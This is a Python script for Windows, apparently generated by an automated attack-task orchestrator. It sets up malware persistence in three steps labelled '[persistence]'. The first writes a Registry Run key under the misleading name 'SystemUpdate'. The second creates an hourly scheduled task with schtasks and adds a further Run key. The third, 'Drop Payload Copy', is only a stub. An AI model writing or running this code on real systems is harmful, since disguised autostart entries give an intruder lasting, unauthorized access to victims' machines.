#!/usr/bin/env python3
import sys
import json
import time
import subprocess
import os
import winreg
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    value_name = 'SystemUpdate'
    value_data = sys.executable

    try:
        # Open the registry key
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            # Set the value for the Run key
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
            # Verify by reading back
            registered_value, _ = winreg.QueryValueEx(key, value_name)
            registered = (registered_value == value_data)

        result = {
            'key_path': key_path,
            'value_name': value_name,
            'value_data': value_data if registered else None
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            'key_path': key_path,
            'value_name': value_name,
            'value_data': None
        }
        return {'success': False, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    task_name = "HourlyTask"
    schedule = "hourly"
    action = None
    try:
        # Determine the executable path
        exe_path = sys.executable if sys.executable else os.path.abspath(sys.argv[0])
        
        # Create a scheduled task using schtasks
        result = subprocess.run(
            ['schtasks', '/create', '/tn', task_name, '/tr', exe_path, '/sc', schedule, '/mo', '60', '/f'],
            capture_output=True, text=True, timeout=10
        )
        
        if result.returncode == 0:
            action = exe_path
        else:
            print(f"Failed to create scheduled task: {result.stderr}")
        
        # Register in Windows Registry for persistence
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, exe_path)
                registered_exe_path, _ = winreg.QueryValueEx(key, task_name)
                if registered_exe_path != exe_path:
                    print("Failed to verify registry entry.")
        except Exception as reg_error:
            print(f"Registry error: {reg_error}")
        
        return {'success': True, 'data': {'task_name': task_name, 'schedule': schedule, 'action': action},
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'task_name': task_name, 'schedule': schedule, 'action': action},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    try:
        result = {
        "file_path": "<string>",
        "hidden": "<boolean>"
}
        return {"success": True, "data": result,
                "metadata": {"task_id": "T3", "execution_time": time.time()-start, "is_stub": True}}
    except Exception as e:
        return {"success": False, "error": f"{type(e).__name__}: {e}",
                "metadata": {"task_id": "T3", "execution_time": time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Create Registry Run Key [persistence] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Create Registry Run Key): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Create Registry Run Key): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create Scheduled Task [persistence] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create Scheduled Task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create Scheduled Task): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Drop Payload Copy [persistence] ──
    try:
        r = task_T3(None)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Drop Payload Copy): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Drop Payload Copy): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))